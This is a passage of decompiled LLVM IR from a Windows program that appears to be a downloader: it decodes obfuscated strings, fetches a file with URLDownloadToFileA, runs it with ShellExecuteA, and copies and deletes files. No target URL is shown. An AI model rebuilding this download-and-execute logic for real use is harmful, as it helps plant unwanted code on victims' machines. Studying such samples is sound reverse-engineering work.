  ret i32 %0, !insn.addr !1235
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1236
}

define i32 @function_405e0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15, i32 %arg16, i32 %arg17, i32 %arg18, i32 %arg19, i32 %arg20, i32 %arg21, i32 %arg22) local_unnamed_addr {
dec_label_pc_405e0c:
  %0 = call i1 @__decompiler_undefined_function_1()
  %stack_var_48 = alloca i32, align 4
  store i32 %arg12, i32* %stack_var_48, align 4
  br i1 %0, label %dec_label_pc_405e7a, label %dec_label_pc_405e11, !insn.addr !1237

dec_label_pc_405e11:                              ; preds = %dec_label_pc_405e0c
  %1 = inttoptr i32 %arg2 to i8*, !insn.addr !1238
  %2 = load i8, i8* %1, align 1, !insn.addr !1238
  %3 = trunc i32 %arg2 to i8, !insn.addr !1238
  %factor = mul i8 %3, 31
  %4 = add i8 %2, %factor, !insn.addr !1239
  store i8 %4, i8* %1, align 1, !insn.addr !1239
  %5 = call i32 @__readfsdword(i32 0), !insn.addr !1240
  store i32 %5, i32* %stack_var_48, align 4, !insn.addr !1240
  %6 = ptrtoint i32* %stack_var_48 to i32, !insn.addr !1240
  call void @__writefsdword(i32 0, i32 %6), !insn.addr !1241
  ret i32 0, !insn.addr !1242

dec_label_pc_405e7a:                              ; preds = %dec_label_pc_405e0c
  %7 = trunc i32 %arg2 to i8, !insn.addr !1243
  call void @__asm_out(i32 255, i8 %7), !insn.addr !1243
  ret i32 %arg2, !insn.addr !1243
}

define i32 @function_405e7d() local_unnamed_addr {
dec_label_pc_405e7d:
  %esp.0.reg2mem = alloca i32, !insn.addr !1244
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %2 = icmp eq i32 %1, 32770, !insn.addr !1244
  %3 = icmp eq i1 %2, false, !insn.addr !1245
  br i1 %3, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1245

dec_label_pc_405e88:                              ; preds = %dec_label_pc_405e7d
  %4 = call i32 @function_406f9c(), !insn.addr !1246
  %5 = call i32 @"@LStrPos"(), !insn.addr !1247
  %6 = call i32 @"@LStrPos"(), !insn.addr !1248
  %7 = add i32 %6, -1, !insn.addr !1249
  %8 = icmp slt i32 %7, 0, !insn.addr !1250
  %9 = add i32 %5, 2, !insn.addr !1251
  %10 = icmp sgt i32 %9, %7, !insn.addr !1252
  %or.cond = or i1 %8, %10
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1253

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %11 = add i32 %0, -12, !insn.addr !1254
  store i32 %11, i32* %stack_var_-4, align 4, !insn.addr !1255
  %12 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1255
  %13 = call i32 @"@LStrCopy"(), !insn.addr !1256
  %14 = inttoptr i32 %11 to i32*, !insn.addr !1257
  %15 = load i32, i32* %14, align 4, !insn.addr !1257
  %16 = icmp eq i32 %15, 0, !insn.addr !1257
  store i32 %12, i32* %esp.0.reg2mem, !insn.addr !1258
  br i1 %16, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1258

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %17 = call i32 @function_406d84(), !insn.addr !1259
  %18 = call i32 @"@LStrFromPChar"(), !insn.addr !1260
  %19 = call i32 @"@LStrCat"(), !insn.addr !1261
  %20 = call i32 @function_4036c8(), !insn.addr !1262
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1263
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !1264
  %23 = call i32 @function_4036c8(), !insn.addr !1265
  %24 = inttoptr i32 %23 to i8*, !insn.addr !1266
  store i8* %24, i8** %stack_var_-20, align 4, !insn.addr !1266
  %25 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1266
  %26 = call i1 @CopyFileA(i8* %24, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1267
  %27 = call i32 @function_405b70(), !insn.addr !1268
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !1268
  br label %dec_label_pc_405f34, !insn.addr !1268

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %dec_label_pc_405e7d
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1269
  %29 = load i32, i32* %28, align 4, !insn.addr !1269
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !1270
  %30 = add i32 %esp.0.reload, 8, !insn.addr !1271
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1271
  store i32 4218710, i32* %31, align 4, !insn.addr !1271
  %32 = call i32 @"@LStrArrayClr"(), !insn.addr !1272
  ret i32 %32, !insn.addr !1273
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1274
  ret i32 %0, !insn.addr !1274
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1275
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1276
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1276
  %3 = load i32, i32* %2, align 4, !insn.addr !1276
  ret i32 %3, !insn.addr !1277
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1278
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1278
  store i32 %1, i32* %2, align 4, !insn.addr !1278
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1279
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1279
  %7 = add i8 %4, %6, !insn.addr !1279
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1279
  store i8 %7, i8* %8, align 1, !insn.addr !1279
  %9 = load i32, i32* %eax, align 4, !insn.addr !1280
  ret i32 %9, !insn.addr !1280
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1281
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1281
  store i8 %4, i8* %5, align 1, !insn.addr !1281
  %6 = mul i32 %0, 4096, !insn.addr !1282
  %7 = udiv i32 %0, 1048576, !insn.addr !1282
  %8 = or i32 %7, %6, !insn.addr !1282
  %9 = and i32 %0, 1048576, !insn.addr !1282
  %10 = icmp eq i32 %9, 0, !insn.addr !1282
  %11 = load i32, i32* %edx, align 4, !insn.addr !1283
  %12 = trunc i32 %11 to i16, !insn.addr !1283
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1283
  %14 = sext i8 %13 to i32, !insn.addr !1283
  %15 = or i32 %2, %14, !insn.addr !1283
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1284
  %17 = and i32 %15, -256, !insn.addr !1284
  %18 = or i32 %17, %16, !insn.addr !1284
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1285
  %20 = load i8, i8* %19, align 1, !insn.addr !1285
  %21 = mul i8 %20, 2, !insn.addr !1285
  %22 = lshr i8 %20, 7, !insn.addr !1285
  %23 = or i8 %22, %21, !insn.addr !1285
  store i8 %23, i8* %19, align 1, !insn.addr !1285
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1286
  %26 = udiv i32 %1, 256, !insn.addr !1286
  %27 = trunc i32 %26 to i8, !insn.addr !1286
  %28 = add i8 %25, %27, !insn.addr !1286
  %29 = load i32, i32* %edx, align 4, !insn.addr !1286
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1286
  store i8 %28, i8* %30, align 1, !insn.addr !1286
  %31 = add i32 %8, -4, !insn.addr !1287
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1287
  store i32 4218448, i32* %32, align 4, !insn.addr !1287
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1288
  %34 = sext i1 %33 to i32, !insn.addr !1288
  ret i32 %34, !insn.addr !1289
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1290
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1290
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1290
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1291
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1292
  %3 = add i32 %2, 1, !insn.addr !1292
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1292
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1293
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1294
  ret i32 0, !insn.addr !1295
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1296
  ret i32 %0, !insn.addr !1296
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1297
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1298
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1299
  %2 = add i32 %1, -1, !insn.addr !1299
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1299
  ret i32 %0, !insn.addr !1300
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1301
  %0 = call i32 @function_40603c(), !insn.addr !1302
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1303
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1304
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1304

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1305
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1306
  %5 = load i32, i32* %4, align 4, !insn.addr !1306
  %6 = icmp eq i32 %5, 0, !insn.addr !1306
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1307
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1307

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1308
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1309
  unreachable, !insn.addr !1309

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1310
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1311
  %1 = icmp eq i32 %0, 0, !insn.addr !1311
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1312

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1313
  br label %dec_label_pc_40601a, !insn.addr !1313

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1314
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1315
  %5 = load i32, i32* %4, align 4, !insn.addr !1315
  %6 = mul i32 %5, 1000, !insn.addr !1315
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1316
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1317
  ret i32 %7, !insn.addr !1318
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1319
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1319
  %1 = icmp eq i32 %0, 0, !insn.addr !1319
  store i32 %0, i32* %.reg2mem, !insn.addr !1320
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1320

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1320
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1320
  br label %dec_label_pc_406045, !insn.addr !1320

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1321
  ret i32 %.reload, !insn.addr !1322
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1323
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1324
  ret i32 %1, !insn.addr !1325
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1326
  %1 = icmp eq i32 %0, 0, !insn.addr !1326
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1327

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1328
  br label %dec_label_pc_406076, !insn.addr !1328

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1329
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1330
  ret i32 %3, !insn.addr !1331
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1332
  ret i32 %0, !insn.addr !1333
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1334
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1334
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1334
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1335
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1336
  %3 = add i32 %2, 1, !insn.addr !1336
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1336
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1337
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1338
  ret i32 0, !insn.addr !1339
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1340
  ret i32 %0, !insn.addr !1340
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1341
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1342
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1343
  %2 = add i32 %1, -1, !insn.addr !1343
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1343
  ret i32 %0, !insn.addr !1344
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1345
  ret i32 %0, !insn.addr !1345
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1346
  %ebx.0.reg2mem = alloca i32, !insn.addr !1346
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1347
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1348
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1348
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1348
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1349
  %4 = call i32 @function_4034c8(), !insn.addr !1350
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1351
  %6 = call i32 @function_4034c8(), !insn.addr !1352
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1353
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1353
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1353

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1354
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1354
  %11 = load i8, i8* %10, align 1, !insn.addr !1354
  %12 = icmp eq i8 %11, 61, !insn.addr !1354
  %13 = icmp eq i1 %12, false, !insn.addr !1355
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1355

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1356
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1356
  store i8 46, i8* %16, align 1, !insn.addr !1356
  br label %dec_label_pc_406162, !insn.addr !1357

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1358
  %18 = add i8 %17, -1, !insn.addr !1359
  %19 = add i32 %14, %8, !insn.addr !1360
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1360
  store i8 %18, i8* %20, align 1, !insn.addr !1360
  br label %dec_label_pc_406162, !insn.addr !1360

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1361
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1362
  %23 = icmp eq i32 %22, 0, !insn.addr !1362
  %24 = icmp eq i1 %23, false, !insn.addr !1363
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1363
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1363
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1363

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1364
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1365
  %26 = call i32 @"@LStrClr"(), !insn.addr !1366
  ret i32 %26, !insn.addr !1367
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1368
  ret i32 %0, !insn.addr !1368
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1369
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1370
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1371
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1372
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1373
  ret i32 %4, !insn.addr !1374
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1375
  %esp.0.reg2mem = alloca i32, !insn.addr !1375
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1375
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1376
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1376
  br label %dec_label_pc_4061cc, !insn.addr !1376

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1377
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1377
  store i32 0, i32* %2, align 4, !insn.addr !1377
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1378
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1378
  store i32 0, i32* %4, align 4, !insn.addr !1378
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1379
  %6 = icmp eq i32 %5, 0, !insn.addr !1379
  %7 = icmp eq i1 %6, false, !insn.addr !1380
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1380
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1380
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1380

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1381
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1381
  store i32 0, i32* %9, align 4, !insn.addr !1381
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1382
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1382
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1383
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1383
  store i32 %0, i32* %13, align 4, !insn.addr !1383
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1384
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1384
  store i32 4219659, i32* %15, align 4, !insn.addr !1384
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1385
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1385
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1385
  store i32 %16, i32* %18, align 4, !insn.addr !1385
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1386
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1387
  %20 = call i32 @function_4060f0(), !insn.addr !1388
  %21 = call i32 @function_4036c8(), !insn.addr !1389
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1390
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1391
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1391
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1391
  store i32 %25, i32* %24, align 4, !insn.addr !1391
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1392
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1393
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1394
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1394
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1394
  store i32 %30, i32* %29, align 4, !insn.addr !1394
  %31 = call i32 @function_4034c8(), !insn.addr !1395
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1396
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1397
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1397
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1397
  %35 = call i32 @function_40618c(), !insn.addr !1398
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1399
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1399
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1400
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1400
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1400
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1401
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1401
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1401
  store i32 %40, i32* %42, align 4, !insn.addr !1401
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1402
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1403
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1403
  store i32 0, i32* %45, align 4, !insn.addr !1403
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1404
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1404
  store i32 0, i32* %47, align 4, !insn.addr !1404
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1405
  %49 = call i32 @function_4036c8(), !insn.addr !1406
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1407
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1407
  store i32 %49, i32* %51, align 4, !insn.addr !1407
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1408
  %53 = call i32 @function_4060f0(), !insn.addr !1409
  %54 = call i32 @function_4036c8(), !insn.addr !1410
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1411
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1411
  store i32 %54, i32* %56, align 4, !insn.addr !1411
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1412
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1412
  store i32 0, i32* %58, align 4, !insn.addr !1412
  %59 = call i32 @function_4060e8(), !insn.addr !1413
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1414
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1414
  store i32 1, i32* %61, align 4, !insn.addr !1414
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1415
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1415
  store i32 0, i32* %63, align 4, !insn.addr !1415
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1416
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1416
  store i32 0, i32* %65, align 4, !insn.addr !1416
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1417
  %67 = call i32 @function_4036c8(), !insn.addr !1418
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1419
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1419
  store i32 %67, i32* %69, align 4, !insn.addr !1419
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1420
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1420
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1420
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1421
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1421
  store i32 0, i32* %73, align 4, !insn.addr !1421
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1422
  %75 = load i32, i32* %73, align 4, !insn.addr !1423
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1424
  store i32 4219666, i32* %69, align 4, !insn.addr !1425
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1426
  ret i32 %76, !insn.addr !1427
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1428
  ret i32 %0, !insn.addr !1428
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1429
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1430
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1431
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1431
  %ecx.0.reg2mem = alloca i32, !insn.addr !1431
